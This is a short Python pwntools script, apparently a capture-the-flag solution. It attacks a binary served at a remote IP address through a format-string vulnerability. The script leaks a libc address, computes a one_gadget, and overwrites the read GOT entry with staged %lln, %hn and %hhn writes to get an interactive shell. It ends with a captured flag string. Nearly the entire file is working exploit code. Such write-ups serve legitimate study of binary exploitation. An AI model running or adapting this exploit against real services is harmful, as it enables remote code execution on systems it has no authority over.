#!/usr/bin/env python
#coding:utf-8
from pwn import*
context(arch='amd64',os='linux',log_level='debug')

binary='./main'
elf=ELF(binary)
libc=elf.libc


# io=process(binary)
io=remote('49.235.243.206',10505)
sl=lambda x :io.sendline(x)
ru=lambda x :io.recvuntil(x,drop)
irt=lambda  :io.interactive()

read_got = elf.got['read']
#gdb.attach(io) 
#payload = '%p,'*10 
payload = '%11$p,' 
sl(payload) 
libc_base = int(ru(',')[:-1],16) - 0x20830 
one_gadget = libc_base + 0xf1147 
log.success('libc_base => ' + hex(libc_base))

payload = '%' 
payload += str(read_got)
payload += 'c' 
payload += '%8$lln;' 
sl(payload) 
ru(';') 
payload = '%'+str(read_got + 2)+'c'+'%19$lln;' 
sl(payload) 
ru(';') 
payload = '%'+str(one_gadget & 0xffff)+'c'+'%10$hn' 
payload += '%'+str(((one_gadget >> 16) & 0xff) + 0xb9)+'c'+'%38$hhn' 
sl(payload) 
irt()
#flag{3DD8600C697604883D8FF17048A6AF37}